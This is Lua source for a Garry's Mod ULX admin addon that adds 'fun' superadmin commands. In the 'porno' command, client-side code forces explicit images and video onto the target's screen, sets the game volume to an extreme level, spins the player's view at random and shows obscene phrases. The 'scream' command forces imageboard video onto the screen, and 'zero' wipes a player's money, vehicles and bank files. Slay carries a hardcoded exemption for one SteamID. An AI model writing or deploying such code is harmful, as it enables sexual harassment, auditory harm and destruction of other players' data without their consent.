...
function ulx.slay( calling_ply, target_plys )
	...
	for i=1, #target_plys do
		...
		elseif v:IsFrozen() then
			ULib.tsayError( calling_ply, v:Nick() .. " is frozen!", true )
		elseif v:SteamID() == 'STEAM_0:0:93077762' then
...
------------------------------ Cloak ------------------------------
function ulx.cloak( calling_ply, target_plys, should_cloak)
	
	for i=1, #target_plys do
		if not should_cloak then
			fCloak( target_plys[i] )
		else
			fUnCloak( target_plys[i] )
		end
	end	
...
cloak:help( "Cloak targets" )
cloak:setOpposite( "ulx uncloak", {_, _, true}, "!uncloak" )
...
if CLIENT then
	...
	local phrases = { 'I am lox!', 'Мамку ебал', 'Idi nahuy', 'Иди нахуй', 'Я лох!', 'ВЫ ВСЕ ПИДОРЫ', 'САМ ТАКОЙ0', 'fuck you', 'Я босс всея качалки', 'Ты лох!' }
	local pornoURL = 'https://kail.is-inside.me/i4uq1UzG.webm'

	local pornoRingtone = 'https://kail.is-inside.me/1m0VnhR1.mp3'
	local negrRingtone = 'https://kail.is-inside.me/1k5kVUNj.mp3'

	function pornoAttack()

		local pornoSound = nil

		local negrSoundp = nil

		timer.Create( 'pornohuy', 2.5, 0, function() system.FlashWindow() end )

		hook.Add( 'HUDShouldDraw', 'PORNO!!!!!!!!!!!!!!!!!!!!!!', function( name )
		...
		hook.Add( 'Think', 'PORNO!!!!!!!!!!!!!!!!!!!!!!', function( name )
			...
			RunConsoleCommand( 'volume', 1000000 )
			...
			LocalPlayer():SetEyeAngles( Angle( math.random( 1, 360 ), math.random( 1, 360 ), math.random( 1, 360 ) ) )
		...
		html:SetHTML( [[ <img src="https://cdn.boyspornpics.com/tmp/pimp/fuck.gif" width="1920" height="1080"> ]] )
		...
		block.Paint = function( self, w, h ) end
...
local porno = ulx.command( 'Fun', 'ulx porno', ulx.porno, '!porno' )

porno:addParam{ type = ULib.cmds.PlayerArg, target = '!^', ULib.cmds.ignoreCanTarget }

porno:defaultAccess( 'superadmin' )

porno:help( 'Запускает смачное порно для игрока.' )

-----------------------------------------------------------------

function ulx.zero( calling_ply, target_ply )
	...
	target_ply:setDarkRPVar( 'money', 0 )

	--------------------------------------------------------------------

	fcd.playerVehicles[ target_ply:UniqueID() ] = {}

	fcd.saveVehicles( target_ply )

	fcd.sendOwned( target_ply )

	--------------------------------------------------------------------

	local data = file.Read( '_arcbank/accounts/personal/' .. ARCBank.GetAccountID( ARCBank.GetPlayerID( target_ply ) ) .. '.txt', 'DATA' )
	...
	if data then
		...
		ARCBank.WriteAccountFile( data, function( didwork ) end )

	end

	--------------------------------------------------------------------

	ulx.fancyLogAdmin( calling_ply, '#A обнулил счета игрока #T', target_ply )

end

local zero = ulx.command( 'Fun', 'ulx zero', ulx.zero, '!zero' )

zero:addParam{ type = ULib.cmds.PlayerArg, target = '!^', ULib.cmds.ignoreCanTarget }

zero:defaultAccess( 'superadmin' )

zero:help( 'Обнуляет все счета, машины у игрока.' )


if CLIENT then
	local pornoURL = 'https://2ch.hk/b/src/170203245/15179530723780.webm'


	function screamAttack()
		...
		html:SetHTML( string.format( [[ <html><head></head><body><video src="%s" width="%s" height="%s" autoplay loop></video><style type="text/css">body{ overflow:hidden; }</style></body></html>  ]], pornoURL, ScrW(), ScrH() ) )
		...
		timer.Simple( 60, function()  html:Remove() end )
...
function ulx.scream( calling_ply, target_ply )
	...
	target_ply:SendLua( 'screamAttack()' )

	ulx.fancyLogAdmin( calling_ply, '#A сломал мозг #T', target_ply )

end


local scream = ulx.command( 'Fun', 'ulx scream', ulx.scream, '!scream' )

scream:addParam{ type = ULib.cmds.PlayerArg }

scream:defaultAccess( 'superadmin' )

scream:help( 'Запускает не особо страшную хуйню с двачей на игрока.' )
